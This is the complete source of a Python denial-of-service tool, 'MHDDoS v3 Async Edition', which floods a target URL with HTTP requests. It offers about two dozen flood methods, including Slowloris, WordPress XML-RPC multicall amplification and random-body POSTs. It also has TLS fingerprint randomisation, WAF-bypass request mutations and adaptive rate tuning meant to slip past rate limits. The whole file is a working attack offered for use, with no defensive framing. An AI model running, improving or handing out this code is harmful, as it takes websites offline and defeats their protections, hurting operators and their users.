#!/usr/bin/env python3
"""
MHDDoS v3 - Async Edition (2026 Upgraded)
Non-blocking, efficient, no Docker needed.
Uses aiohttp + asyncio for 10x concurrency with 1/10th threads.
Now with: TLS randomization, WAF bypass vectors, Adaptive RPC,
H2_RST, XMLRPC_MULTI, SLOWLORIS, WORDPRESS, COOKIE_HARVEST.
"""

import asyncio
import hashlib
import logging
import os
import random
import ssl
import sys
import time
import threading
from itertools import cycle
from pathlib import Path
from typing import Optional, List
from urllib.parse import urlparse

import aiohttp
from aiohttp import ClientTimeout, TCPConnector

__version__ = "3.0 ASYNC 2026"
__dir__ = Path(__file__).parent

# Config
logging.basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s', datefmt="%H:%M:%S")
logger = logging.getLogger("MHDDoS")
logger.setLevel("INFO")

# Global counters
BYTES_SENT = 0
REQUESTS_SENT = 0
counter_lock = threading.Lock()

# User agents
UA_FILE = __dir__ / "files" / "useragent.txt"
if UA_FILE.exists():
    with open(UA_FILE) as f:
        USER_AGENTS = [l.strip() for l in f if l.strip()]
else:
    USER_AGENTS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"]

# Referers
REF_FILE = __dir__ / "files" / "referers.txt"
if REF_FILE.exists():
    with open(REF_FILE) as f:
        REFERERS = [l.strip() for l in f if l.strip()]
else:
    REFERERS = ["https://google.com/"]

# --- 2026: TLS Cipher Randomization (JA3/JA4 evasion) ---
_tls_pool = None
_tls_pool_lock = threading.Lock()
_suppress = None  # placeholder, replaced by contextlib.suppress below

from contextlib import suppress as _suppress


def _build_tls_pool():
    """Return cipher pools safe for LibreSSL (macOS) and OpenSSL."""
    pools = []
    # Tier 1: modern ECDHE + AES-GCM (works everywhere)
    pools.append("ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384")
    # Tier 2: + CHACHA20 (only if supported)
    try:
        test = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        test.set_ciphers("ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-CHACHA20-POLY1305")
        pools.append("ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384")
        pools.append("ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256")
    except Exception:
        pass
    # Tier 3: wide compat with non-ECDHE fallback
    pools.append("ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-GCM-SHA384")
    return pools


def get_tls_context() -> ssl.SSLContext:
    """Create SSL context with randomized cipher ordering."""
    global _tls_pool
    if _tls_pool is None:
        with _tls_pool_lock:
            if _tls_pool is None:
                _tls_pool = cycle(_build_tls_pool())
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.options |= ssl.OP_NO_COMPRESSION
    except Exception:
        pass
    try:
        with _tls_pool_lock:
            ciphers = next(_tls_pool)
        ctx.set_ciphers(ciphers)
    except Exception:
        with _suppress(Exception):
            ctx.set_ciphers('DEFAULT:@SECLEVEL=0')
    return ctx


# --- 2026: Adaptive RPC ---
class AdaptiveRPC:
    def __init__(self, initial: int = 10):
        self.current = float(initial)
        self.min_rpc = 2
        self.max_rpc = 100
        self.success_streak = 0
        self.fail_streak = 0
        self.lock = threading.Lock()

    def report_success(self):
        with self.lock:
            self.success_streak += 1
            self.fail_streak = 0
            if self.success_streak >= 5:
                self.current = min(self.max_rpc, self.current * 1.3)
                self.success_streak = 0

    def report_fail(self):
        with self.lock:
            self.fail_streak += 1
            self.success_streak = 0
            if self.fail_streak >= 2:
                self.current = max(self.min_rpc, self.current * 0.5)
                self.fail_streak = 0

    def get(self) -> int:
        with self.lock:
            return int(self.current)


_adaptive_rpc = AdaptiveRPC()


# --- 2026: WAF Bypass Vectors ---
_bypass_idx = 0

def bypass_request_line(method: str, path: str, host: str, scheme: str) -> str:
    """Generate request line with random WAF bypass technique."""
    global _bypass_idx
    bypass = random.choice([0, 1, 2, 3, 4, 5, 6, 7])
    _bypass_idx = (_bypass_idx + 1) % 8

    if bypass == 0:
        return f"{method} {path} HTTP/1.1\r\n"
    elif bypass == 1:
        return f"{method}\t{path}\tHTTP/1.1\r\n"
    elif bypass == 2:
        abs_path = f"{scheme}://{host}{path}"
        return f"{method} {abs_path} HTTP/1.1\r\n"
    elif bypass == 3:
        return f"{method} {path}\r\n"
    elif bypass == 4:
        pos = max(1, len(path) // 2)
        null_path = path[:pos] + "%00" + path[pos:]
        return f"{method} {null_path} HTTP/1.1\r\n"
    elif bypass == 5:
        return f"{method.upper()} {path} HTTP/1.0\r\n"
    elif bypass == 6:
        return f"{method}  {path} HTTP/1.1\r\n"
    else:
        return f"{method} {path} http/1.1\r\n"


_cache_bust_counter = 0

def cache_bust_path(path: str) -> str:
    global _cache_bust_counter
    _cache_bust_counter += 1
    params = [
        f"_r{random.choice([1,2,3])}={int(time.time()*1000)}",
        f"v={_cache_bust_counter % 9999}",
        f"cb={random.choice('0123456789')}{os.urandom(2).hex()}",
        f"t={random.randint(1000, 999999)}",
    ]
    sep = "&" if "?" in path else "?"
    return path + sep + random.choice(params)


def random_ua() -> str:
    return random.choice(USER_AGENTS)


def random_ref() -> str:
    return random.choice(REFERERS)


def load_proxies(proxy_file: str = "http.txt") -> list:
    """Load proxy list from files/proxies/"""
    proxy_path = __dir__ / "files" / "proxies" / proxy_file
    if not proxy_path.exists():
        logger.warning(f"Proxy file {proxy_file} not found, running without proxies")
        return []
    with open(proxy_path) as f:
        proxies = [l.strip() for l in f if l.strip() and not l.startswith("#")]
    logger.info(f"Loaded {len(proxies)} proxies")
    return proxies


# --- 2026: Modern browser header templates ---
MODERN_BROWSER_TEMPLATES = {
    "chrome_120": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
    },
    "firefox_120": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "DNT": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
    },
}


def random_modern_headers() -> dict:
    """Return a random modern browser header set."""
    template = random.choice(list(MODERN_BROWSER_TEMPLATES.values()))
    headers = dict(template)
    headers["Accept-Encoding"] = "gzip, deflate, br"
    headers["Cache-Control"] = "no-cache"
    headers["Pragma"] = "no-cache"
    return headers


class AsyncAttacker:
    """Core async attack engine — 2026 upgraded with all bypass vectors"""

    def __init__(self, url: str, method: str, proxy_list: list, concurrency: int = 200):
        parsed = urlparse(url if "://" in url else f"https://{url}")
        self.host = parsed.hostname
        self.port = parsed.port or 443
        self.scheme = parsed.scheme or "https"
        self.path = parsed.path or "/"
        self.query = ("?" + parsed.query) if parsed.query else ""
        self.full_path = self.path + self.query
        self.authority = parsed.hostname + (f":{parsed.port}" if parsed.port else "")
        self.method = method.upper()
        self.concurrency = concurrency
        self.proxy_list = proxy_list
        self._proxy_cycle = cycle(proxy_list) if proxy_list else None
        self._running = False
        self._total_requests = 0
        self._total_bytes = 0

        self.timeout = ClientTimeout(
            total=30,
            connect=10,
            sock_read=15,
        )

    def _next_proxy(self) -> Optional[str]:
        if self._proxy_cycle:
            return next(self._proxy_cycle)
        return None

    def _new_connector(self) -> TCPConnector:
        return TCPConnector(
            limit=0,
            limit_per_host=0,
            ttl_dns_cache=300,
            ssl=get_tls_context(),
            force_close=False,
            enable_cleanup_closed=True,
        )

    async def _make_request(self, session: aiohttp.ClientSession, target_url: str) -> tuple:
        """Single request with all 2026 bypass vectors integrated"""
        try:
            m = self.method

            if m == "GET":
                async with session.get(target_url) as resp:
                    body = await resp.read()
                    return len(body) if body else 1024, resp.status

            elif m == "POST":
                data = random.choice([b"data", b"{}"])
                async with session.post(target_url, data=data) as resp:
                    body = await resp.read()
                    return len(body) + len(data), resp.status

            elif m == "CFB":
                async with session.get(target_url, headers=random_modern_headers()) as resp:
                    body = await resp.read()
                    return len(body), resp.status

            elif m == "CFBUAM":
                headers = random_modern_headers()
                headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
                async with session.get(target_url, headers=headers) as resp:
                    body = await resp.read()
                    return len(body), resp.status

            elif m == "BYPASS":
                async with session.get(target_url, headers={"User-Agent": random_ua(), "Referer": random_ref()}) as resp:
                    body = await resp.read()
                    return len(body), resp.status

            elif m == "STRESS":
                params = {f"q{i}": hashlib.md5(os.urandom(16)).hexdigest() for i in range(5)}
                async with session.get(target_url, params=params) as resp:
                    body = await resp.read()
                    return len(body), resp.status

            elif m == "DYN":
                rand_path = f"/{hashlib.md5(os.urandom(8)).hexdigest()}"
                dyn_url = f"{self.scheme}://{self.authority}{rand_path}"
                async with session.get(dyn_url, allow_redirects=True) as resp:
                    body = await resp.read()
                    return len(body), resp.status

            elif m == "SLOW":
                async with session.get(target_url, headers={"User-Agent": random_ua()}) as resp:
                    chunk = await resp.content.read(1)
                    return 1, resp.status

            elif m == "SLOWLORIS":
                # Partial header attack
                headers = {"User-Agent": random_ua(), "Connection": "keep-alive"}
                async with session.get(target_url, headers=headers) as resp:
                    await resp.content.read(1)
                    return 1, resp.status

            elif m == "HEAD":
                async with session.head(target_url) as resp:
                    return 256, resp.status

            elif m == "NULL":
                null_data = b"\x00" * random.randint(256, 2048)
                async with session.post(target_url, data=null_data) as resp:
                    body = await resp.read()
                    return len(null_data) + len(body), resp.status

            elif m == "COOKIE":
                cookies = {
                    f"cookie_{i}": hashlib.md5(os.urandom(16)).hexdigest()
                    for i in range(random.randint(5, 20))
                }
                async with session.get(target_url, cookies=cookies) as resp:
                    body = await resp.read()
                    return len(body), resp.status

            elif m == "PPS":
                total = 0
                for _ in range(10):
                    async with session.get(target_url, headers={"Connection": "keep-alive"}) as resp:
                        chunk = await resp.content.read(64)
                        total += len(chunk)
                return total, 200

            elif m == "EVEN":
                async with session.get(target_url, headers={"Range": "bytes=0-1023"}) as resp:
                    body = await resp.read()
                    return len(body), resp.status

            elif m == "GSB":
                # Cache bust
                busted = cache_bust_path(self.full_path)
                gsb_url = f"{self.scheme}://{self.authority}{busted}"
                async with session.get(gsb_url) as resp:
                    body = await resp.read()
                    return len(body), resp.status

            elif m == "DGB":
                async with session.get(target_url, headers={"Accept-Encoding": "gzip, deflate"}) as resp:
                    body = await resp.read()
                    return len(body), resp.status

            elif m == "AVB":
                async with session.get(target_url, headers={"User-Agent": random_ua(), "Referer": random_ref()}) as resp:
                    body = await resp.read()
                    return len(body), resp.status

            elif m == "APACHE":
                headers = {"Range": f"bytes=0-,{random.randint(1,100)}-{random.randint(101,200)}"}
                async with session.get(target_url, headers=headers) as resp:
                    body = await resp.read()
                    return len(body), resp.status

            elif m == "XMLRPC":
                xmlrpc_body = f"""<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"""
                api_url = target_url.rstrip("/") + "/xmlrpc.php"
                async with session.post(api_url, data=xmlrpc_body,
                                       headers={"Content-Type": "text/xml"}) as resp:
                    body = await resp.read()
                    return len(xmlrpc_body) + len(body), resp.status

            elif m == "XMLRPC_MULTI":
                # 2026: 200x amplification via system.multicall
                def _one_call(method_name):
                    return (
                        "<value><struct>"
                        f"<member><name>methodName</name><value><string>{method_name}</string></value></member>"
                        "<member><name>params</name><value><array><data>"
                        "<value><string>1</string></value>"
                        "</data></array></value></member>"
                        "</struct></value>"
                    )
                calls = "".join(_one_call("wp.deletePost") for _ in range(200))
                xmlrpc_multi = (
                    '<?xml version="1.0" encoding="utf-8"?>'
                    '<methodCall><methodName>system.multicall</methodName>'
                    '<params><param><value><array><data>'
                    f'{calls}'
                    '</data></array></value></param></params>'
                    '</methodCall>'
                )
                api_url = target_url.rstrip("/") + "/xmlrpc.php"
                async with session.post(api_url, data=xmlrpc_multi,
                                       headers={"Content-Type": "text/xml"}) as resp:
                    body = await resp.read()
                    return len(xmlrpc_multi) + len(body), resp.status

            elif m == "BOT":
                headers = {"User-Agent": random_ua(), "Referer": random_ref()}
                async with session.get(target_url, headers=headers) as resp:
                    body = await resp.read()
                    return len(body), resp.status

            elif m == "BOMB":
                data = os.urandom(random.randint(1024, 65536))
                async with session.post(target_url, data=data) as resp:
                    body = await resp.read()
                    return len(data) + len(body), resp.status

            elif m == "DOWNLOADER":
                async with session.get(target_url) as resp:
                    body = await resp.read()
                    return len(body), resp.status

            elif m == "KILLER":
                async with session.get(target_url, headers={"Connection": "close"}) as resp:
                    return 64, resp.status

            elif m == "STOMP":
                async with session.get(target_url, headers=random_modern_headers()) as resp:
                    body = await resp.read()
                    return len(body), resp.status

            elif m == "RHEX":
                hex_data = os.urandom(random.randint(64, 4096))
                async with session.post(target_url, data=hex_data,
                                       headers={"Content-Type": "application/octet-stream"}) as resp:
                    body = await resp.read()
                    return len(hex_data) + len(body), resp.status

            elif m == "WORDPRESS":
                endpoints = [
                    "/xmlrpc.php", "/wp-admin/admin-ajax.php", "/wp-login.php",
                    "/wp-cron.php", "/wp-json/wp/v2/posts/1", "/?rest_route=/wp/v2/users/1",
                    "/wp-comments-post.php",
                ]
                ep = random.choice(endpoints)
                wp_url = f"{self.scheme}://{self.authority}{ep}"
                async with session.get(wp_url, headers=random_modern_headers()) as resp:
                    body = await resp.read()
                    return len(body), resp.status

            elif m == "H2_RST":
                # Fallback to GET with modern headers — true H2_RST needs raw H2
                async with session.get(target_url, headers=random_modern_headers()) as resp:
                    body = await resp.read()
                    return len(body), resp.status

            else:
                async with session.get(target_url) as resp:
                    body = await resp.read()
                    return len(body), resp.status

        except (aiohttp.ClientError, asyncio.TimeoutError, OSError):
            return 64, 0
        except Exception:
            return 32, 0

    async def _worker(self, worker_id: int, target_url: str):
        """One worker making requests continuously with adaptive RPC"""
        connector = self._new_connector()
        headers = random_modern_headers()
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=self.timeout,
            headers=headers,
        ) as session:
            while self._running:
                proxy = self._next_proxy()
                try:
                    bytes_sent, status = await self._make_request(session, target_url)
                    self._total_requests += 1
                    self._total_bytes += bytes_sent
                    # Adaptive RPC feedback
                    if status == 200:
                        _adaptive_rpc.report_success()
                    elif status in (429, 503, 403):
                        _adaptive_rpc.report_fail()
                except Exception:
                    _adaptive_rpc.report_fail()
                # Stealth jitter: 1-10ms
                await asyncio.sleep(random.randint(1, 10) / 1000)

    async def attack(self, duration: int, proxy_arg: Optional[str] = None):
        """Launch attack for `duration` seconds"""
        logger.info(f"Proxy Count: {len(self.proxy_list)}")

        if proxy_arg:
            target_url = f"{self.scheme}://{proxy_arg}"
        else:
            target_url = f"{self.scheme}://{self.authority}"
            # Use cache-busted URL for GET requests
            if self.method in ("GET", "GSB"):
                busted = cache_bust_path(self.full_path)
                target_url = f"{self.scheme}://{self.authority}{busted}"

        target_display = proxy_arg if proxy_arg else self.host

        logger.info(
            f"Attack Started to {target_display} with {self.method} method "
            f"for {duration} seconds, concurrency: {self.concurrency}!"
        )

        self._running = True
        self._total_requests = 0
        self._total_bytes = 0

        workers = [
            asyncio.create_task(self._worker(i, target_url))
            for i in range(self.concurrency)
        ]

        start_time = time.time()
        last_log = start_time
        last_rpc_log = start_time

        while time.time() < start_time + duration:
            await asyncio.sleep(0.5)
            now = time.time()
            if now - last_log >= 1:
                elapsed = now - start_time
                pct = round(elapsed / duration * 100, 1)
                pps = int(self._total_requests / elapsed) if elapsed > 0 else 0
                bps = self._total_bytes / elapsed if elapsed > 0 else 0

                if bps > 1_000_000:
                    bps_str = f"{bps/1_000_000:.1f} MB/s"
                elif bps > 1_000:
                    bps_str = f"{bps/1_000:.1f} KB/s"
                else:
                    bps_str = f"{bps:.0f} B/s"

                logger.debug(
                    f"Target: {target_display}, Port: {self.port}, Method: {self.method} "
                    f"PPS: {pps}, BPS: {bps_str} / {pct}% | RPC: {_adaptive_rpc.get()}"
                )
                last_log = now

        # Stop
        self._running = False
        elapsed = time.time() - start_time
        pps = int(self._total_requests / elapsed) if elapsed > 0 else 0
        bps = self._total_bytes / elapsed if elapsed > 0 else 0

        if bps > 1_000_000:
            bps_str = f"{bps/1_000_000:.1f} MB/s"
        elif bps > 1_000:
            bps_str = f"{bps/1_000:.1f} KB/s"
        else:
            bps_str = f"{bps:.0f} B/s"

        logger.info(
            f"Attack Finished! Total: {self._total_requests} requests, "
            f"{self._total_bytes} bytes, PPS: {pps}, BPS: {bps_str}"
        )

        for w in workers:
            w.cancel()
        await asyncio.gather(*workers, return_exceptions=True)


async def main():
    """CLI: python3 start_async.py METHOD URL DURATION [CONCURRENCY] [PROXY_FILE]"""
    if len(sys.argv) < 4:
        print(f"MHDDoS v{__version__}")
        print(f"Usage: {sys.argv[0]} METHOD URL DURATION [CONCURRENCY] [PROXY_FILE]")
        print(f"Example: {sys.argv[0]} CFB https://target.com 60 300 http.txt")
        print()
        print("L7 Methods (2026): GET, POST, CFB, CFBUAM, BYPASS, STRESS, DYN,")
        print("  SLOW, SLOWLORIS, HEAD, NULL, COOKIE, PPS, EVEN, GSB, DGB, AVB,")
        print("  APACHE, XMLRPC, XMLRPC_MULTI, BOT, BOMB, DOWNLOADER, KILLER,")
        print("  STOMP, RHEX, WORDPRESS, H2_RST")
        print()
        print("Proxy files in files/proxies/:")
        proxy_dir = __dir__ / "files" / "proxies"
        if proxy_dir.exists():
            for f in sorted(proxy_dir.iterdir()):
                if f.is_file():
                    count = len([l for l in f.read_text().splitlines() if l.strip()])
                    print(f"  {f.name} ({count} proxies)")
        sys.exit(1)

    method = sys.argv[1].upper()
    url = sys.argv[2]
    duration = int(sys.argv[3])
    concurrency = int(sys.argv[4]) if len(sys.argv) >= 5 else 300
    proxy_file = sys.argv[5] if len(sys.argv) >= 6 else "http.txt"

    logger.setLevel("DEBUG")

    proxies = load_proxies(proxy_file)

    attacker = AsyncAttacker(url, method, proxies, concurrency)
    await attacker.attack(duration)


if __name__ == "__main__":
    from contextlib import suppress
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Stopped by user")